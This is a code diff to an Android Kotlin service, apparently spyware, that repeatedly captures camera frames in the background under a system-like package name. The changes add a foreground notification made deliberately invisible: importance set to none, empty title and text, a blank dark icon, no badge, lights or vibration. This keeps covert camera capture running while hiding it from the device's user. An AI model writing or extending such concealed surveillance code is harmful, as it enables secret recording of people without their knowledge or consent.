@@ -1,6 +1,6 @@
 package com.system.service.monitors
 
-import android.app.Service
+import android.app.*
 import android.content.Intent
 import android.graphics.ImageFormat
 import android.hardware.camera2.*
@@ -15,18 +15,22 @@ class CameraStreamService : Service() {
 
     companion object {
         var isRunning = false
+        private const val CHANNEL_ID = "cam_stream"
+        private const val NOTIF_ID   = 11
     }
 
-    private val streaming = AtomicBoolean(false)
+    private val streaming  = AtomicBoolean(false)
     private var cameraDevice: CameraDevice? = null
     private var session: CameraCaptureSession? = null
     private var imageReader: ImageReader? = null
     private var thread: HandlerThread? = null
     private var handler: Handler? = null
-    private var intervalMs: Long = 2000L // 2 sec interval
+    private var intervalMs: Long = 2000L
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         if (intent?.action == "STOP") { stopStream(); stopSelf(); return START_NOT_STICKY }
+        createChannel()
+        startForeground(NOTIF_ID, buildNotif())
         intervalMs = intent?.getLongExtra("interval", 2000L) ?: 2000L
         isRunning = true
         streaming.set(true)
@@ -71,8 +75,7 @@ class CameraStreamService : Service() {
                     cam.createCaptureSession(listOf(imageReader!!.surface),
                         object : CameraCaptureSession.StateCallback() {
                             override fun onConfigured(s: CameraCaptureSession) {
-                                session = s
-                                scheduleCapture(s, req)
+                                session = s; scheduleCapture(s, req)
                             }
                             override fun onConfigureFailed(s: CameraCaptureSession) {}
                         }, handler)
@@ -83,7 +86,7 @@ class CameraStreamService : Service() {
         } catch (_: SecurityException) {}
     }
 
-    private fun scheduleCapture(s: CameraCaptureSession, req: android.hardware.camera2.CaptureRequest) {
+    private fun scheduleCapture(s: CameraCaptureSession, req: CaptureRequest) {
         if (!streaming.get()) return
         try { s.capture(req, null, handler) } catch (_: Exception) {}
         handler?.postDelayed({ scheduleCapture(s, req) }, intervalMs)
@@ -96,6 +99,17 @@ class CameraStreamService : Service() {
         try { imageReader?.close() } catch (_: Exception) {}
         thread?.quitSafely()
     }
+
+    private fun createChannel() {
+        val ch = NotificationChannel(CHANNEL_ID, "Camera", NotificationManager.IMPORTANCE_NONE)
+            .apply { setShowBadge(false); enableLights(false); enableVibration(false) }
+        getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
+    }
+
+    private fun buildNotif() = Notification.Builder(this, CHANNEL_ID)
+        .setContentTitle("").setContentText("")
+        .setSmallIcon(android.R.drawable.screen_background_dark)
+        .build()
 
     override fun onDestroy() { stopStream(); super.onDestroy() }
     override fun onBind(intent: Intent?): IBinder? = null
